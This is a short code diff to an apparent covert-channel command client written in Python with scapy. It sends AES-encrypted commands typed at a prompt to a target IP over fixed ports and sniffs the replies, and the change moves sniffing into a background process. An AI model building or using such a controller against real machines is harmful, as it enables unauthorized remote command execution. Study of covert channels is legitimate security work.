@@ -3,11 +3,13 @@ import argparse
 import logging
 import binascii
 import collections
+import base64
 from random import uniform, randint
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from Crypto.Cipher import AES
 from random import randint
+from multiprocessing import Process
 MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
 INIT_VALUE = "JohnCenaTheChamp"
 OUTPUT = collections.defaultdict(list)
@@ -120,6 +122,10 @@ def send_cmd(msg):
 	send_end_msg(args.destIP, sport)
 
 
+def scapySniff():
+	sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
+
+
 def main():
 	verify_root()
 	ports = [2525, 14156, 6364]
@@ -128,7 +134,10 @@ def main():
 	while True:
 		msg = raw_input('Send: ')
 		send_cmd(msg)
-		sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
+		sniffProc = Process(target=scapySniff)
+		sniffProc.daemon = True
+		sniffProc.start()
+		# sniff(filter="tcp and src {}".format(args.destIP), stop_filter=get_result)
 		
 
 if __name__ == '__main__':
